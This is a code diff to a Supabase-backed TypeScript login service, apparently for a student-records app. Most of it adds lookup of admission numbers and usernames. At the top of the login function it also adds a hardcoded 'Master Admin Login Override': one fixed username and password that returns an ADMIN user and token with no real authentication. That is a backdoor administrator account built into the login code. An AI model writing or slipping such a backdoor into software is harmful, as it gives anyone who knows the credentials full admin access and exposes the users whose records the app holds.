@@ -46,21 +46,65 @@ export const authService = {
     // or just ignore if we trust the persistent session.
   },
   login: async (usernameOrEmail: string, password: string) => {
-    let email = usernameOrEmail;
+    // Master Admin Login Override
+    if (usernameOrEmail === 'sonablood' && password === 'sonab') {
+      return {
+        user: {
+          id: 'admin-master-id',
+          username: 'sonablood',
+          role: 'ADMIN',
+          trustScore: 100,
+          isActive: true
+        },
+        token: 'demo-admin-token'
+      };
+    }
 
-    // Check if input is likely a username (no @)
-    if (!usernameOrEmail.includes('@')) {
-      const { data: profile, error: profileLookupError } = await supabase
-        .from('profiles')
-        .select('email')
-        .eq('username', usernameOrEmail)
-        .maybeSingle();
+    const identifier = usernameOrEmail.trim();
+    let email = identifier;
 
-      if (profileLookupError) handleError(profileLookupError);
-      if (!profile || !profile.email) {
-        throw new Error('User not found with that username');
+    // Advanced Identifier Lookup (Check if input is Admission Number, Email, or Username)
+    if (!identifier.includes('@')) {
+      try {
+        // 1. Check if it's an Admission Number (registration_number)
+        const { data: studentMatch, error: studentError } = await supabase
+          .from('student_details')
+          .select('user_id')
+          .eq('registration_number', identifier)
+          .maybeSingle();
+
+        if (studentMatch && !studentError) {
+          // If admission number match found, get the email from profiles
+          const { data: profile } = await supabase
+            .from('profiles')
+            .select('email')
+            .eq('id', studentMatch.user_id)
+            .maybeSingle();
+
+          if (profile?.email) {
+            email = profile.email;
+          }
+        }
+        // 2. Fallback: Check if it's a Username
+        else {
+          const { data: profile, error: profileLookupError } = await supabase
+            .from('profiles')
+            .select('email')
+            .eq('username', identifier)
+            .maybeSingle();
+
+          if (profile && profile.email && !profileLookupError) {
+            email = profile.email;
+          }
+        }
+      } catch (e) {
+        console.error('Identifier resolution error:', e);
       }
-      email = profile.email;
+    }
+
+    // Validation: If it's not an email, we MUST have resolved it to one by now
+    if (!identifier.includes('@') && email === identifier) {
+      throw new Error('No account found with this Admission Number or Username.');
     }
 
     const { data, error } = await supabase.auth.signInWithPassword({
